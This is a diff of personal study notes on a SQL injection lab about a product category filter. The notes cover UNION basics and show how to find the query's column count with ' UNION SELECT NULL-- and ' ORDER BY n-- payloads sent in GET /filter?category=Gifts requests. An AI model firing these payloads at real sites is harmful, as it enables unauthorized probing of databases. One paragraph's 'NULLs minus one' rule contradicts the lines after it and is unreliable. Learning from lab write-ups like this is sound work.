@@ -3,40 +3,94 @@ SQLi - Product category filter
 End Goal: determine the number of columns returned by the query. 
 
 Background (Union):
+The UNION query: 
+    Concatonates the results of the two queries into a single result.
+    For example, the query: select A, B from Table 1 UNION select C, D from Table 2
+    That says: Select the values from columns A and B, from Table 1, plus the values from C and D from Table 2.
+    and concatonate the results together.
+    
 
-table1      table2
-a | b       c | d 
------       -----
-1 , 2       2 , 3
-3 , 4       4 , 5
+Both Tables: 1 & 2 have two columns each. A & B, and C & D, respectfully.
 
-Query #1: select a, b from table1
-1,2
-3,4
+                  table1      table2
+columns -->       A | B       C | D         
+                  -----       -----
+                  1 , 2       2 , 3        
+                  3 , 4       4 , 5
 
-Query #2: select a, b from table1 UNION select c,d from table2
-1,2
-3,4
-2,3
-4,5
+- First Query: 
+  Select A, B from table1
+      1,2
+      3,4
+  
+- Second Query: 
+  Select A, B from table1 UNION select C, D from table2, (catted together by UNION)
+      1,2  
+      3,4   
+      2,3       
+      4,5
 
-Rule: 
+
+Rule when using the UNION operator: 
 - The number and the order of the columns must be the same in all queries
 - The data types must be compatible
 
-SQLi attack (way #1):
+Remember ' --
+the single, or double quote is to "break" the string, or code, which enables you to inject your own query into it
+and use the double hyphens to ignore/comment out the rest of the code. Thus, only the injected query you created will be executed.
 
+SQLi attack (first method):
+----------------------------------
 select ? from table1 UNION select NULL
+
+(If the number of nulls does not match the number of columns, the database returns an error
+theefore, continue to iterate through the NULL requests until you receive and error, and the
+number of NULLs, minus one, is the number of columns contained)
+
+Example:
+    ' UNION SELECT NULL--
+    ' UNION SELECT NULL,NULL--
+    ' UNION SELECT NULL,NULL,NULL--
+etc.
+
+Until you get this:
 -error -> incorrect number of columns
 
 select ? from table1 UNION select NULL, NULL, NULL
--200 response code -> correct number of columns
-
-SQLi attack (way #2):
-
-select a, b from table1 order by 3
+-200 response code -> indicates you have reached the correct number of columns
 
 
-script.py <url> 
+SQLi attack (2nd method):
+-------------------------------------
+select a, b from table1 ORDER by 3
+
+So, ORDER by 1, orders by the first column, (A in this example)
+    ORDER by 2, orders by the second column, (B in this example)
+    ORDER by 3  orders by the third column. (There is no third column and will throw an error.)
+    
+  Similar to the first method, you will iterate through the ORDER by secuence 1,2,3,4, etch.. untill you receive an error.
 
 
+Using ' UNION SELECT NULL--
+------------------------------
+When conducting the UNION SELECT NULL, attack, pay attention to the name and values of each column.
+This will help in determining how many clolumns , (NULLs), to add to the query you are creating.
+For example: 
+    ' UNION SELECT NULL--           adds one column
+    ' UNION SELECT NULL,NULL--      adds two columns
+
+example injection query
+GET /filter?category=Gifts' UNION SELECT NULL,NULL--
+
+
+Using ORDER by
+-------------------------
+
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+
+
+GET /filter?category=Gifts' ORDER BY 3--
+
+and if ' ORDER BY 4-- causes an error, then that means the table contains 3 columns
